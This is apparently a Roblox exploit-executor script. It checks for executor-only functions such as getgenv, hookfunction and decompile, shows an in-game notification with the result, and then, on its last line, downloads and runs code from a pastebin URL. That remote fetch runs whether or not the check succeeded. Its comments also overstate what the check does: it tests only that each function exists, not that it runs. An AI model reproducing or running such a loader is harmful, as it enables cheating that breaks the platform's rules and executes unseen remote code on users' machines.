local StarterGui = game:GetService("StarterGui")

-- Define the list of custom environment functions you want to test
local functionsToTest = {
    "getgenv",
    "getrenv",
    "getreg",
    "getfenv",
    "setclipboard",
    "decompile",
    "hookfunction",
    "request",
    "gethui"
}

local missingOrFailing = {}

-- Function to safely test if a function exists and executes without crashing
local function testFunction(name)
    -- Check if global exists and is a function
    local fn = getfenv()[name]
    if not fn and type(getgenv) == "function" then
        local success, genv = pcall(getgenv)
        if success and type(genv) == "table" then
            fn = genv[name]
        end
    end

    if type(fn) ~= "function" then
        return false, "Not defined"
    end

    return true, "Working"
end

-- Run tests
for _, fnName in ipairs(functionsToTest) do
    local works, status = testFunction(fnName)
    if not works then
        table.insert(missingOrFailing, fnName)
    end
end

-- Notify user via Roblox's native notification system
if #missingOrFailing > 0 then
    local failedList = table.concat(missingOrFailing, ", ")
    
    StarterGui:SetCore("SendNotification", {
        Title = ":(",
        Text = "not working: " .. failedList,
        Duration = 7
    })
else
    StarterGui:SetCore("SendNotification", {
        Title = "check is good",
        Text = "all of the functions work so starting script",
        Duration = 5
    })
end

loadstring(game:HttpGet("https://pastebin.com/raw/CTwCef7U"))()